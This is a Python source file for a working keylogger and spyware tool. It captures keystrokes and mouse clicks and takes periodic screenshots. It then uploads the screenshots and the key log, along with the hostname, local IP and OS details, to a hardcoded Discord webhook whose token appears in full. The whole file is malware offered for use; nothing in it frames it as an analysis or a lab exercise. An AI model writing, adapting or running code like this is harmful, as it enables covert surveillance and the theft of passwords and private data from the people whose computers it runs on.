import pyautogui
import requests
import socket
import platform
from pynput.keyboard import Key, Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import time
import pyperclip

# Constants
KEYS_INFORMATION_FILE = "key_log.txt"
SCREENSHOT_INTERVAL_SECONDS = 5
RUN_TIME_SECONDS = 60
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1160773937333018666/MqHAfoWi0vIBzTF8Z9_n_nHVcZ8W4I3Jo7SebkczEal7wQc3uCqOdIX-sJYBV9yMA4wJ"

# Global variables
keys_pressed = []
mouse_clicks = []
start_time = time.time()
count = 0

def get_ip_address():
    """Retrieve the local IP address of the primary network interface."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return '127.0.0.1'

def get_system_info():
    """Gather system information like hostname and operating system."""
    hostname = socket.gethostname()
    local_ip = get_ip_address()
    operating_system = platform.system() + " " + platform.release()
    return hostname, local_ip, operating_system

def on_key_press(key):
    """Callback function to handle key press events."""
    global keys_pressed

    keys_pressed.append((key, time.time()))
    write_data_to_file()

def on_mouse_click(x, y, button, pressed):
    """Callback function to record mouse clicks."""
    if pressed:
        mouse_clicks.append((x, y, button, time.time()))
        write_data_to_file()

def write_data_to_file():
    """Write the captured keys and mouse clicks to a file."""
    with open(KEYS_INFORMATION_FILE, "a") as file:
        for item in keys_pressed + mouse_clicks:
            if isinstance(item, tuple) and len(item) == 4:  # Mouse click data
                x, y, button, click_time = item
                file.write(f"Mouse Click: X={x}, Y={y}, Button={button}, Time={click_time - start_time:.2f}\n")
            elif isinstance(item, tuple) and len(item) == 2:  # Key press data
                key, key_time = item
                key_str = str(key).replace("'", "")
                if key_str.find("space") > 0:
                    file.write('\n')
                elif key_str.find("Key") == -1:
                    file.write(key_str)

        keys_pressed.clear()
        mouse_clicks.clear()

def take_and_send_screenshot():
    """Take a screenshot and send it to Discord."""
    screenshot_filename = f"screenshot_{int(time.time() - start_time)}.png"
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_filename)

    time.sleep(1)  # Ensure file is saved

    try:
        with open(screenshot_filename, "rb") as f:
            photo = f.read()
        hostname, local_ip, operating_system = get_system_info()
        current_timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        request_data = {
            "username": "ExfiltrateComputerScreenshot",
            "content": f"Hostname: {hostname}\nLocal IP: {local_ip}\nOperating System: {operating_system}\nTimestamp: {current_timestamp}"
        }
        response = requests.post(DISCORD_WEBHOOK_URL, data=request_data, files={"screenshot.png": photo})
        if response.status_code != 200:
            print(f"Error while sending screenshot to Discord: {response.status_code}")
    except FileNotFoundError:
        print(f"Failed to open the screenshot file: {screenshot_filename}")

def main():
    """Main function to start keylogger and mouse listener."""
    print("Recording mouse clicks, keyboard input, and taking screenshots for 1 minute...")

    with KeyboardListener(on_press=on_key_press) as key_listener, MouseListener(on_click=on_mouse_click) as mouse_listener:
        try:
            while time.time() < start_time + RUN_TIME_SECONDS:
                if int(time.time() - start_time) % SCREENSHOT_INTERVAL_SECONDS == 0:
                    take_and_send_screenshot()
        except KeyboardInterrupt:
            pass

    # Send the key_log.txt to Discord
    with open(KEYS_INFORMATION_FILE, "rb") as f:
        keylog = f.read()
    hostname, local_ip, operating_system = get_system_info()
    current_timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    request_data = {
        "username": "Keylogger",
        "content": f"Hostname: {hostname}\nLocal IP: {local_ip}\nOperating System: {operating_system}\nTimestamp: {current_timestamp}\nKey Log"
    }
    response = requests.post(DISCORD_WEBHOOK_URL, data=request_data, files={"key_log.txt": keylog})
    if response.status_code != 200:
        print(f"Error while sending key log to Discord: {response.status_code}")

print("Recording completed.")
   

if __name__ == "__main__":
    main()

